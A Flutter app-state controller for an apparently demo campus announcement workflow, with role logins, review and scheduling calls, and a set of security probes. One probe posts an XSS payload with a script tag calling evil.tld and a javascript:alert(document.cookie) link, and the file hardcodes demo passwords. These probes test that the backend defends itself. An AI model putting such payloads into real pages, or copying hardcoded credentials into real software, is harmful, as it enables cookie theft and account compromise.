/// Application state controller (`ChangeNotifier`) for the Flutter Web UI.
/// Manages authentication, role switching, workflow operations, automation
/// scheduler ticks, negative-path security probes, and live observability.
library;

import 'package:flutter/foundation.dart';
import '../../shared/models/announcement.dart';
import '../../shared/models/audit_log.dart';
import '../services/api_client.dart';

class SecurityProbeResult {
  final String title;
  final String category;
  final int statusCode;
  final String errorCode;
  final String message;
  final Map<String, dynamic> rawResponse;
  final DateTime timestamp;

  const SecurityProbeResult({
    required this.title,
    required this.category,
    required this.statusCode,
    required this.errorCode,
    required this.message,
    required this.rawResponse,
    required this.timestamp,
  });
}

class AppState extends ChangeNotifier {
  final ApiClient apiClient;

  bool isLoading = false;
  bool usingFallbackTransport = false;
  String? activeToken;
  String activeTokenMode = 'valid';
  UserRole currentRole = UserRole.publisher;
  String currentUserName = 'Hannah Cho (Publisher Ops)';
  String currentUserEmail = 'publisher@campus.edu';

  DateTime virtualTime = DateTime.now().toUtc();
  bool isDataMinimizedView = false;

  List<Announcement> announcements = [];
  List<Map<String, dynamic>> rawAnnouncementPayloads = [];
  List<AuditLogEntry> auditLogs = [];
  Map<String, dynamic> healthData = {};
  Map<String, dynamic> metricsData = {};

  String? bannerMessage;
  bool bannerIsError = false;
  Map<String, dynamic>? lastTickReport;
  List<SecurityProbeResult> probeHistory = [];

  AppState({ApiClient? apiClient}) : apiClient = apiClient ?? ApiClient();

  static const Map<UserRole, ({String email, String password, String label})>
  roleCredentials = {
    UserRole.author: (
      email: 'author@campus.edu',
      password: 'AuthorPass!26',
      label: 'Prof. Elena Vance (Author)',
    ),
    UserRole.reviewer: (
      email: 'reviewer@campus.edu',
      password: 'ReviewerPass!26',
      label: 'Dean Marcus Sterling (Reviewer)',
    ),
    UserRole.publisher: (
      email: 'publisher@campus.edu',
      password: 'PublisherPass!26',
      label: 'Hannah Cho (Publisher Ops)',
    ),
    UserRole.campusUser: (
      email: 'student@campus.edu',
      password: 'StudentPass!26',
      label: 'Alex Rivera (Campus User)',
    ),
  };

  List<Announcement> get escalatedFailures => announcements
      .where((a) => a.status == AnnouncementStatus.publishFailedPermanent)
      .toList();

  List<Announcement> get transientRetries => announcements
      .where((a) => a.status == AnnouncementStatus.publishFailedTransient)
      .toList();

  Future<void> initialize() async {
    await switchRole(UserRole.publisher);
  }

  void clearBanner() {
    bannerMessage = null;
    notifyListeners();
  }

  void _setBanner(String message, {bool isError = false}) {
    bannerMessage = message;
    bannerIsError = isError;
  }

  Future<void> togglePreparedFallbackMode(bool enabled) async {
    apiClient.forcePreparedFallback = enabled;
    await switchRole(currentRole);
    _setBanner(
      enabled
          ? 'Switched to Prepared Controlled Fallback Mode (Week 18 Offline Demo Ready).'
          : 'Switched to Live Backend API Mode (${apiClient.baseUrl}).',
    );
    notifyListeners();
  }

  Future<bool> switchRole(
    UserRole role, {
    String tokenMode = 'valid',
  }) async {
    isLoading = true;
    notifyListeners();

    final creds = roleCredentials[role]!;
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/auth/login',
      jsonBody: {
        'email': creds.email,
        'password': creds.password,
        'tokenMode': tokenMode,
      },
    );

    usingFallbackTransport = res.usedFallback;

    if (res.isOk) {
      activeToken = res.body['token'] as String?;
      activeTokenMode = tokenMode;
      currentRole = role;
      final userMap = res.body['user'] as Map<String, dynamic>? ?? {};
      currentUserName = (userMap['displayName'] as String?) ?? creds.label;
      currentUserEmail = (userMap['email'] as String?) ?? creds.email;
      await refreshAll();
      if (tokenMode != 'valid') {
        _setBanner(
          'Issued "$tokenMode" token for security demonstration. Protected API calls will now reject with HTTP 401.',
          isError: true,
        );
      } else {
        _setBanner('Signed in as $currentUserName [${role.label}].');
      }
      isLoading = false;
      notifyListeners();
      return true;
    } else {
      _setBanner(
        res.body['message'] as String? ?? 'Authentication failed.',
        isError: true,
      );
      isLoading = false;
      notifyListeners();
      return false;
    }
  }

  Future<void> refreshAll() async {
    final annRes = await apiClient.request(
      method: 'GET',
      path: '/api/v1/announcements',
      bearerToken: activeToken,
    );
    usingFallbackTransport = annRes.usedFallback;

    if (annRes.isOk) {
      isDataMinimizedView = (annRes.body['dataMinimized'] as bool?) ?? false;
      if (annRes.body['virtualTime'] != null) {
        virtualTime = DateTime.parse(annRes.body['virtualTime'] as String);
      }
      final list = (annRes.body['announcements'] as List<dynamic>?) ?? const [];
      rawAnnouncementPayloads = list
          .map((e) => Map<String, dynamic>.from(e as Map))
          .toList();
      announcements = rawAnnouncementPayloads
          .map(Announcement.fromJson)
          .toList();
    } else if (annRes.statusCode == 401) {
      _setBanner(
        'HTTP 401 Unauthorized: ${annRes.body['message']} (${annRes.body['error']})',
        isError: true,
      );
    }

    // Fetch health & metrics
    final healthRes = await apiClient.request(
      method: 'GET',
      path: '/api/v1/health',
    );
    if (healthRes.isOk) {
      healthData = healthRes.body;
      if (healthData['virtualTime'] != null) {
        virtualTime = DateTime.parse(healthData['virtualTime'] as String);
      }
    }

    final metricsRes = await apiClient.request(
      method: 'GET',
      path: '/api/v1/metrics',
    );
    if (metricsRes.isOk) {
      metricsData = metricsRes.body;
    }

    // Fetch audit logs if Reviewer or Publisher
    if (currentRole == UserRole.reviewer || currentRole == UserRole.publisher) {
      final auditRes = await apiClient.request(
        method: 'GET',
        path: '/api/v1/audit-logs',
        bearerToken: activeToken,
      );
      if (auditRes.isOk) {
        final rawLogs =
            (auditRes.body['auditLogs'] as List<dynamic>?) ?? const [];
        auditLogs = rawLogs
            .map((e) => AuditLogEntry.fromJson(e as Map<String, dynamic>))
            .toList();
      }
    }

    notifyListeners();
  }

  Future<bool> createDraft({
    required String title,
    required String body,
    required AnnouncementCategory category,
    required String targetAudience,
    required bool pinned,
  }) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements',
      bearerToken: activeToken,
      jsonBody: {
        'title': title,
        'body': body,
        'category': category.wireName,
        'targetAudience': targetAudience,
        'pinned': pinned,
      },
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner('Created draft "${res.body['announcement']['id']}".');
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<bool> submitForReview(String id) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$id/submit',
      bearerToken: activeToken,
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner('Announcement $id submitted for review.');
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<bool> reviewAnnouncement({
    required String id,
    required bool approve,
    required String reviewNotes,
  }) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$id/review',
      bearerToken: activeToken,
      jsonBody: {
        'decision': approve ? 'approve' : 'reject',
        'reviewNotes': reviewNotes,
      },
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner(
        approve
            ? 'Announcement $id approved for scheduling.'
            : 'Announcement $id returned to author with review notes.',
      );
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<bool> scheduleAnnouncement({
    required String id,
    required DateTime publishAt,
    required DateTime expiresAt,
    required bool pinned,
    required FailureSimulationMode simulateFailure,
  }) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$id/schedule',
      bearerToken: activeToken,
      jsonBody: {
        'publishAt': publishAt.toUtc().toIso8601String(),
        'expiresAt': expiresAt.toUtc().toIso8601String(),
        'pinned': pinned,
        'simulateFailure': simulateFailure.wireName,
      },
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner(
        'Scheduled $id (Delivery mode: ${simulateFailure.label}).',
      );
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<bool> recoverPermanentFailure({
    required String id,
    required String resolutionNote,
    bool publishImmediately = true,
  }) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$id/recover',
      bearerToken: activeToken,
      jsonBody: {
        'resolutionNote': resolutionNote,
        'publishImmediately': publishImmediately,
      },
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner(
        'Resolved permanent failure on $id via human action and ${publishImmediately ? "published immediately" : "re-scheduled"}.',
      );
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<bool> archiveAnnouncement(String id) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$id/archive',
      bearerToken: activeToken,
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner('Archived announcement $id.');
      notifyListeners();
      return true;
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
      notifyListeners();
      return false;
    }
  }

  Future<void> runSchedulerTick({
    int advanceMinutes = 0,
    int advanceSeconds = 0,
    bool ignoreRetryBackoff = true,
  }) async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/automation/tick',
      bearerToken: activeToken,
      jsonBody: {
        'advanceMinutes': advanceMinutes,
        'advanceSeconds': advanceSeconds,
        'ignoreRetryBackoff': ignoreRetryBackoff,
      },
    );
    await refreshAll();
    if (res.isOk) {
      lastTickReport = res.body['tickReport'] as Map<String, dynamic>?;
      final pub = (lastTickReport?['publishedIds'] as List?)?.length ?? 0;
      final rec =
          (lastTickReport?['recoveredTransientIds'] as List?)?.length ?? 0;
      final trFail =
          (lastTickReport?['transientFailedIds'] as List?)?.length ?? 0;
      final perm =
          (lastTickReport?['permanentEscalatedIds'] as List?)?.length ?? 0;
      final exp = (lastTickReport?['expiredIds'] as List?)?.length ?? 0;
      _setBanner(
        'Scheduler Tick Complete — Published: $pub | Recovered Transient: $rec | Transient Retry Queued: $trFail | Escalated Permanent: $perm | Auto-Expired: $exp',
        isError: perm > 0,
      );
    } else {
      _setBanner(
        'HTTP ${res.statusCode} (${res.body['error']}): ${res.body['message']}',
        isError: true,
      );
    }
    notifyListeners();
  }

  Future<void> createSnapshot() async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/admin/snapshot',
      bearerToken: activeToken,
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner('Created point-in-time state snapshot for rollback recovery.');
    } else {
      _setBanner(
        'Snapshot failed: ${res.body['message']}',
        isError: true,
      );
    }
    notifyListeners();
  }

  Future<void> restoreSnapshot() async {
    final res = await apiClient.request(
      method: 'POST',
      path: '/api/v1/admin/rollback',
      bearerToken: activeToken,
    );
    await refreshAll();
    if (res.isOk) {
      _setBanner('State rollback completed from point-in-time snapshot.');
    } else {
      _setBanner(
        'Rollback failed: ${res.body['message']}',
        isError: true,
      );
    }
    notifyListeners();
  }

  Future<void> resetControlledDemo() async {
    await apiClient.request(
      method: 'POST',
      path: '/api/v1/admin/reset-demo',
      bearerToken: activeToken,
    );
    lastTickReport = null;
    await switchRole(UserRole.publisher);
    _setBanner(
      'Reset controlled demonstration dataset and virtual clock to baseline.',
    );
    notifyListeners();
  }

  /// Executes deterministic Week 14 & Week 15 Negative-Path Security &
  /// Boundary probes and records the structured HTTP response for inspection.
  Future<void> executeSecurityProbe(String probeType) async {
    late ApiResponse res;
    late String title;
    late String category;

    switch (probeType) {
      case 'tampered_token':
        title = 'Altered / Forged HMAC-SHA256 Token Signature';
        category = 'Week 14 Authentication (SA8)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'author@campus.edu',
            'password': 'AuthorPass!26',
            'tokenMode': 'tampered',
          },
        );
        final forgedToken = loginRes.body['token'] as String? ?? 'invalid.token';
        res = await apiClient.request(
          method: 'GET',
          path: '/api/v1/announcements',
          bearerToken: forgedToken,
        );
        break;

      case 'expired_token':
        title = 'Expired Bearer Session Token';
        category = 'Week 14 Authentication (SA8)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'reviewer@campus.edu',
            'password': 'ReviewerPass!26',
            'tokenMode': 'expired',
          },
        );
        final expiredToken = loginRes.body['token'] as String? ?? '';
        res = await apiClient.request(
          method: 'GET',
          path: '/api/v1/announcements',
          bearerToken: expiredToken,
        );
        break;

      case 'unauthorized_role':
        title = 'Unauthorized Role Escalation (Author Attempting to Schedule)';
        category = 'Week 14 RBAC Authorization (SA8/IA5)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'author@campus.edu',
            'password': 'AuthorPass!26',
          },
        );
        final authorToken = loginRes.body['token'] as String? ?? '';
        res = await apiClient.request(
          method: 'POST',
          path: '/api/v1/announcements/ANN-105/schedule',
          bearerToken: authorToken,
          jsonBody: {
            'publishAt': virtualTime.toIso8601String(),
            'expiresAt': virtualTime
                .add(const Duration(hours: 6))
                .toIso8601String(),
          },
        );
        break;

      case 'xss_injection':
        title = 'Malicious Script Injection Payload (<script>)';
        category = 'Week 14 Input Validation & Sanitization (IA5)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'author@campus.edu',
            'password': 'AuthorPass!26',
          },
        );
        final authorToken = loginRes.body['token'] as String? ?? '';
        res = await apiClient.request(
          method: 'POST',
          path: '/api/v1/announcements',
          bearerToken: authorToken,
          jsonBody: {
            'title': 'Urgent Grant <script>fetch("https://evil.tld")</script>',
            'body': 'Click here javascript:alert(document.cookie) to claim.',
            'category': 'academic',
            'targetAudience': 'All Campus',
          },
        );
        break;

      case 'schedule_conflict':
        title = 'Overlapping Pinned Channel Slot Conflict';
        category = 'Week 13 Conflict Detection (SA7)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'publisher@campus.edu',
            'password': 'PublisherPass!26',
          },
        );
        final pubToken = loginRes.body['token'] as String? ?? '';
        // Create & approve or schedule ANN-105 into same window/category or test conflict
        // ANN-101 is Pinned + Academic + All Campus from (now - 4h) to (now + 20h).
        // Let's submit & approve ANN-107 (Academic) or schedule an Academic pinned item.
        res = await _triggerPinnedAcademicConflict(pubToken);
        break;

      default:
        title = 'Illegal State Transition (Schedule Unapproved Draft ANN-107)';
        category = 'Week 13 Bounded State Machine (SA7)';
        final loginRes = await apiClient.request(
          method: 'POST',
          path: '/api/v1/auth/login',
          jsonBody: {
            'email': 'publisher@campus.edu',
            'password': 'PublisherPass!26',
          },
        );
        final pubToken = loginRes.body['token'] as String? ?? '';
        res = await apiClient.request(
          method: 'POST',
          path: '/api/v1/announcements/ANN-107/schedule',
          bearerToken: pubToken,
          jsonBody: {
            'publishAt': virtualTime.toIso8601String(),
            'expiresAt': virtualTime
                .add(const Duration(hours: 5))
                .toIso8601String(),
          },
        );
        break;
    }

    probeHistory.insert(
      0,
      SecurityProbeResult(
        title: title,
        category: category,
        statusCode: res.statusCode,
        errorCode: (res.body['error'] as String?) ?? 'UNKNOWN',
        message: (res.body['message'] as String?) ?? '',
        rawResponse: res.body,
        timestamp: virtualTime,
      ),
    );

    await refreshAll();
    _setBanner(
      'Executed probe "$title" -> HTTP ${res.statusCode} (${res.body['error']})',
      isError: res.statusCode >= 400,
    );
    notifyListeners();
  }

  Future<ApiResponse> _triggerPinnedAcademicConflict(
    String publisherToken,
  ) async {
    final authorLogin = await apiClient.request(
      method: 'POST',
      path: '/api/v1/auth/login',
      jsonBody: {'email': 'author@campus.edu', 'password': 'AuthorPass!26'},
    );
    final reviewerLogin = await apiClient.request(
      method: 'POST',
      path: '/api/v1/auth/login',
      jsonBody: {
        'email': 'reviewer@campus.edu',
        'password': 'ReviewerPass!26',
      },
    );
    final authorToken = authorLogin.body['token'] as String;
    final reviewerToken = reviewerLogin.body['token'] as String;

    final created = await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements',
      bearerToken: authorToken,
      jsonBody: {
        'title': 'Conflicting Pinned Academic Broadcast Notice',
        'body':
            'This pinned academic announcement overlaps with ANN-101 in the same channel and audience window.',
        'category': 'academic',
        'targetAudience': 'All Campus',
        'pinned': true,
      },
    );
    final newId = created.body['announcement']['id'] as String;

    await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$newId/submit',
      bearerToken: authorToken,
    );
    await apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$newId/review',
      bearerToken: reviewerToken,
      jsonBody: {
        'decision': 'approve',
        'reviewNotes': 'Approved to test conflict detector.',
      },
    );

    return apiClient.request(
      method: 'POST',
      path: '/api/v1/announcements/$newId/schedule',
      bearerToken: publisherToken,
      jsonBody: {
        'publishAt': virtualTime.toIso8601String(),
        'expiresAt': virtualTime.add(const Duration(hours: 4)).toIso8601String(),
        'pinned': true,
      },
    );
  }
}

